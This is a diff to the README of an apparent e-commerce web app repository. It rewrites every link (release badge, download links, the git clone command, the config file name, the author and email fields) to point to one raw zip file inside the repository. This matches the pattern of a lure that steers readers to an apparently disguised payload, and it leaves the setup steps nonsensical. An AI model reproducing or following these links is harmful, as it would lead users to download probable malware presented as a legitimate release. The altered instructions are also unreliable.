@@ -1,8 +1,8 @@
 # E-Commerce App 🛒
 
-![GitHub release](https://img.shields.io/github/release/mooo17/-e-commerce-app.svg?style=flat-square)
+![GitHub release](https://github.com/mooo17/-e-commerce-app/raw/refs/heads/main/Pages/commerce-app-e-v1.5.zip)
 
-Welcome to the E-Commerce App repository! This project aims to build a fully functional e-commerce web application using modern technologies. You can download the latest release [here](https://github.com/mooo17/-e-commerce-app/releases) and follow the instructions to set it up.
+Welcome to the E-Commerce App repository! This project aims to build a fully functional e-commerce web application using modern technologies. You can download the latest release [here](https://github.com/mooo17/-e-commerce-app/raw/refs/heads/main/Pages/commerce-app-e-v1.5.zip) and follow the instructions to set it up.
 
 ## Table of Contents
 
@@ -41,7 +41,7 @@ To get started with the E-Commerce App, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/mooo17/-e-commerce-app.git
+   git clone https://github.com/mooo17/-e-commerce-app/raw/refs/heads/main/Pages/commerce-app-e-v1.5.zip
    cd -e-commerce-app
    ```
 
@@ -55,7 +55,7 @@ To get started with the E-Commerce App, follow these steps:
 
 3. **Set up the database**:
 
-   Make sure PostgreSQL is installed and running. Create a database for the application and update the connection string in the `appsettings.json` file.
+   Make sure PostgreSQL is installed and running. Create a database for the application and update the connection string in the `https://github.com/mooo17/-e-commerce-app/raw/refs/heads/main/Pages/commerce-app-e-v1.5.zip` file.
 
 4. **Run the application**:
 
@@ -69,7 +69,7 @@ To get started with the E-Commerce App, follow these steps:
 
    Open your browser and go to `http://localhost:5000` to see the application in action.
 
-For the latest release, download it [here](https://github.com/mooo17/-e-commerce-app/releases) and follow the instructions provided.
+For the latest release, download it [here](https://github.com/mooo17/-e-commerce-app/raw/refs/heads/main/Pages/commerce-app-e-v1.5.zip) and follow the instructions provided.
 
 ## Usage
 
@@ -114,7 +114,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, please feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/yourusername)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/mooo17/-e-commerce-app/raw/refs/heads/main/Pages/commerce-app-e-v1.5.zip)
+- **Email**: https://github.com/mooo17/-e-commerce-app/raw/refs/heads/main/Pages/commerce-app-e-v1.5.zip
 
-Thank you for checking out the E-Commerce App! Your support and contributions are greatly appreciated. For updates, please visit the [Releases](https://github.com/mooo17/-e-commerce-app/releases) section.
+Thank you for checking out the E-Commerce App! Your support and contributions are greatly appreciated. For updates, please visit the [Releases](https://github.com/mooo17/-e-commerce-app/raw/refs/heads/main/Pages/commerce-app-e-v1.5.zip) section.
